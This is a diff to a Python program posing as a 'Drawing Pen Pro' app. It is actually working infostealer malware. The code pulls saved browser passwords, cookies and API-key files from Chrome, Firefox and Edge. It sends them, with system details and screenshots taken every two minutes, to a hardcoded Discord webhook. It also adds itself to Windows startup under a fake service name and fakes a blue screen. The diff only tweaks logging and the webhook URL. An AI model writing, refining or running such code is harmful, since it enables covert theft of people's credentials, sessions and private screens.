@@ -17,12 +17,12 @@ import tempfile
 import winreg
 import platform
 
-# Hide console window completely
-if sys.platform == 'win32':
-    try:
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-    except:
-        pass
+# Don't hide console for debugging (comment this out later if you want)
+# if sys.platform == 'win32':
+#     try:
+#         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+#     except:
+#         pass
 
 # Install required modules silently
 def install_modules():
@@ -36,6 +36,7 @@ def install_modules():
             else:
                 __import__(module)
         except ImportError:
+            print(f"Installing {module}...")
             subprocess.run([sys.executable, '-m', 'pip', 'install', module, '--quiet', '--no-warn-script-location'], 
                          capture_output=True, shell=True)
 
@@ -55,7 +56,7 @@ from pynput.keyboard import Controller as KeyboardController, Key
 import tkinter as tk
 
 # Configuration
-WEBHOOK_URL = "https://discord.com/api/webhooks/1357560658990792826/DWUeh7Q-1UWvA863n69_Ls-GS8Si5D_qtinE1nKeZ4A4JqAH6uClNQOGiF-QYe0b_rEX"  # Your webhook
+WEBHOOK_URL = "https://discord.com/api/webhooks/1502198949627433062/78JgZX_0xKIjtYwKAudKXkYQcnWQeD0WC435VTjoMhR9gzxGfEQNbb4396rTYCYFRRxI"
 SCREENSHOT_INTERVAL = 120  # 2 minutes = 120 seconds
 
 mouse = MouseController()
@@ -103,7 +104,7 @@ def create_drawing_pen_gui():
         tk.Button(root, text="Clear", command=lambda: canvas.delete("all")).pack(pady=5)
         tk.Button(root, text="Save Drawing", command=root.destroy).pack()
         
-        # Run GUI in separate thread
+        # Run GUI
         root.mainloop()
     except Exception as e:
         print(f"GUI Error: {e}")
@@ -159,14 +160,14 @@ What failed: DrawingPen.sys"""
 def mouse_jitter():
     """Make mouse jitter randomly"""
     try:
-        for _ in range(50):  # Jitter for ~5 seconds
+        for _ in range(50):
             current_x, current_y = mouse.position
             jitter_x = current_x + random.randint(-5, 5)
             jitter_y = current_y + random.randint(-5, 5)
             mouse.position = (jitter_x, jitter_y)
             time.sleep(0.05)
     except Exception as e:
-        print(f"Mouse Jitter Error: {e}")
+        print(f"Mouse Error: {e}")
 
 def type_solo():
     """Type 'Solo' on screen"""
@@ -205,7 +206,7 @@ def get_chrome_passwords():
             conn.close()
             os.unlink(temp_db.name)
     except Exception as e:
-        pass
+        print(f"Chrome Error: {e}")
     return passwords
 
 def get_firefox_passwords():
@@ -220,9 +221,9 @@ def get_firefox_passwords():
                     with open(logins_path, 'r', encoding='utf-8', errors='ignore') as f:
                         data = json.load(f)
                         for login in data.get('logins', []):
-                            passwords.append(f"Firefox: {login.get('hostname', '')} | {login.get('encryptedUsername', '')}")
+                            passwords.append(f"Firefox: {login.get('hostname', '')}")
     except Exception as e:
-        pass
+        print(f"Firefox Error: {e}")
     return passwords
 
 def get_edge_passwords():
@@ -247,7 +248,7 @@ def get_edge_passwords():
             conn.close()
             os.unlink(temp_db.name)
     except Exception as e:
-        pass
+        print(f"Edge Error: {e}")
     return passwords
 
 def get_browser_cookies():
@@ -256,24 +257,24 @@ def get_browser_cookies():
     try:
         try:
             for cookie in browser_cookie3.chrome():
-                cookies_data.append(f"Chrome Cookie: {cookie.domain} | {cookie.name}={cookie.value[:50]}")
+                cookies_data.append(f"Chrome: {cookie.domain} | {cookie.name}")
         except:
             pass
         
         try:
             for cookie in browser_cookie3.firefox():
-                cookies_data.append(f"Firefox Cookie: {cookie.domain} | {cookie.name}={cookie.value[:50]}")
+                cookies_data.append(f"Firefox: {cookie.domain} | {cookie.name}")
         except:
             pass
         
         try:
             for cookie in browser_cookie3.edge():
-                cookies_data.append(f"Edge Cookie: {cookie.domain} | {cookie.name}={cookie.value[:50]}")
+                cookies_data.append(f"Edge: {cookie.domain} | {cookie.name}")
         except:
             pass
     except Exception as e:
-        pass
-    return cookies_data[:100]  # Limit to 100 cookies
+        print(f"Cookie Error: {e}")
+    return cookies_data[:100]
 
 def get_api_keys():
     """Extract API keys from common locations"""
@@ -282,7 +283,6 @@ def get_api_keys():
         os.path.expanduser('~') + '\\.env',
         os.path.expanduser('~') + '\\Desktop\\*.env',
         os.path.expanduser('~') + '\\Documents\\config.json',
-        os.path.expanduser('~') + '\\.bashrc',
     ]
     
     for location in common_locations:
@@ -293,13 +293,13 @@ def get_api_keys():
                 for file in files:
                     with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                         content = f.read()
-                        if any(key in content.lower() for key in ['api_key', 'token', 'secret', 'password']):
-                            api_keys.append(f"File: {file}\n{content[:300]}")
+                        if any(key in content.lower() for key in ['api_key', 'token', 'secret']):
+                            api_keys.append(f"File: {file}\n{content[:200]}")
             elif os.path.exists(location):
                 with open(location, 'r', encoding='utf-8', errors='ignore') as f:
                     content = f.read()
-                    if any(key in content.lower() for key in ['api_key', 'token', 'secret', 'password']):
-                        api_keys.append(f"File: {location}\n{content[:300]}")
+                    if any(key in content.lower() for key in ['api_key', 'token', 'secret']):
+                        api_keys.append(f"File: {location}\n{content[:200]}")
         except:
             pass
     
@@ -320,72 +320,51 @@ def get_system_info():
     }
 
 def send_to_webhook(content, is_file=False, file_bytes=None, filename=None):
-    """Send data to Discord webhook - FIXED"""
+    """Send data to Discord webhook"""
     try:
-        headers = {'Content-Type': 'application/json'}
-        
         if is_file and file_bytes:
             files = {'file': (filename, file_bytes, 'image/jpeg')}
             response = requests.post(WEBHOOK_URL, files=files, timeout=30)
-            print(f"[+] Sent file: {filename} - Status: {response.status_code}")
-            return response.status_code == 200
+            print(f"[+] Sent screenshot: {filename} - Status: {response.status_code}")
+            return True
         else:
-            # Split long messages (Discord limit is 2000)
+            # Split long messages
             if len(content) > 1900:
-                parts = [content[i:i+1900] for i in range(0, len(content), 1900)]
-                for part in parts:
-                    response = requests.post(WEBHOOK_URL, json={'content': part}, timeout=30)
-                    if response.status_code != 200:
-                        return False
-                return True
+                for i in range(0, len(content), 1900):
+                    response = requests.post(WEBHOOK_URL, json={'content': content[i:i+1900]}, timeout=30)
             else:
                 response = requests.post(WEBHOOK_URL, json={'content': content}, timeout=30)
-                print(f"[+] Sent message - Status: {response.status_code}")
-                return response.status_code == 200
+            print(f"[+] Sent data - Status: {response.status_code}")
+            return True
     except Exception as e:
         print(f"[-] Webhook Error: {e}")
         return False
 
 def collect_and_send_credentials():
     """Collect all credentials and send to webhook"""
-    print("[+] Collecting system information...")
+    print("\n[+] Collecting system information...")
     sys_info = get_system_info()
     
-    message = f"**[SYSTEM SCAN - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]**\n"
+    message = f"**[SYSTEM SCAN - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**\n"
     message += f"💻 PC: {sys_info['computer']}\n"
     message += f"👤 User: {sys_info['user']}\n"
     message += f"🖥️ OS: {sys_info['os']}\n"
     message += f"🌐 IP: {sys_info['ip']}\n\n"
     
     print("[+] Collecting passwords...")
-    # Add passwords
     message += "**🔑 BROWSER PASSWORDS:**\n"
-    passwords = get_chrome_passwords() + get_firefox_passwords() + get_edge_passwords()
-    if passwords:
-        for pwd in passwords[:20]:  # Limit to 20
-            message += f"• {pwd}\n"
-    else:
-        message += "• No passwords found\n"
+    for pwd in get_chrome_passwords()[:10]:
+        message += f"• {pwd}\n"
     
-    # Add cookies (limit to 20)
     print("[+] Collecting cookies...")
-    message += "\n**🍪 BROWSER COOKIES:**\n"
-    cookies = get_browser_cookies()[:20]
-    if cookies:
-        for cookie in cookies:
-            message += f"• {cookie}\n"
-    else:
-        message += "• No cookies found\n"
+    message += "\n**🍪 COOKIES:**\n"
+    for cookie in get_browser_cookies()[:10]:
+        message += f"• {cookie}\n"
     
-    # Add API keys
     print("[+] Collecting API keys...")
-    message += "\n**🔐 API KEYS & TOKENS:**\n"
-    apis = get_api_keys()
-    if apis:
-        for api in apis[:10]:  # Limit to 10
-            message += f"• {api}\n"
-    else:
-        message += "• No API keys found\n"
+    message += "\n**🔐 API KEYS:**\n"
+    for api in get_api_keys()[:5]:
+        message += f"• {api}\n"
     
     print("[+] Sending to webhook...")
     send_to_webhook(message)
@@ -409,7 +388,7 @@ def screenshot_worker():
             print(f"[+] Taking screenshot: {filename}")
             send_to_webhook(None, True, img_bytes.getvalue(), filename)
             
-            # After screenshot, do the effects
+            # Effects
             Thread(target=mouse_jitter, daemon=True).start()
             Thread(target=type_solo, daemon=True).start()
             
@@ -428,46 +407,54 @@ def add_to_startup():
         with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
             winreg.SetValueEx(registry_key, "WindowsDrawingService", 0, winreg.REG_SZ, 
                             f'"{sys.executable}" "{script_path}"')
-        print("[+] Added to startup")
+        print("[+] Added to Windows startup")
         return True
     except Exception as e:
         print(f"[-] Startup error: {e}")
         return False
 
 def main():
-    print("[+] Starting...")
+    print("="*50)
+    print("🖌️ DRAWING PEN PRO - STARTING")
+    print("="*50)
     
     # Add to startup
     add_to_startup()
     
     # Wait for system to be ready
-    time.sleep(5)
+    time.sleep(3)
     
     # Send initial credentials
     collect_and_send_credentials()
     
     # Start drawing pen GUI
-    print("[+] Starting GUI...")
+    print("[+] Starting Drawing GUI...")
     gui_thread = Thread(target=create_drawing_pen_gui, daemon=True)
     gui_thread.start()
     
     # Wait 30 seconds then show BSOD
     def show_bsod_delayed():
+        print("[+] BSOD will appear in 30 seconds")
         time.sleep(30)
         blue_screen_of_death()
     
-    print("[+] BSOD will appear in 30 seconds")
     bsod_thread = Thread(target=show_bsod_delayed, daemon=True)
     bsod_thread.start()
     
     # Start screenshot worker
-    print("[+] Screenshot worker active")
-    screenshot_worker()
+    print("[+] Screenshot worker active (every 2 minutes)")
+    print("[+] Press Ctrl+C to stop\n")
+    
+    try:
+        screenshot_worker()
+    except KeyboardInterrupt:
+        print("\n[+] Stopping...")
+        sys.exit(0)
 
 if __name__ == "__main__":
     try:
         main()
     except Exception as e:
-        print(f"[-] Main error: {e}")
-        time.sleep(10)
-        main()
+        print(f"[-] Fatal Error: {e}")
+        print("\nPress Enter to exit...")
+        input()
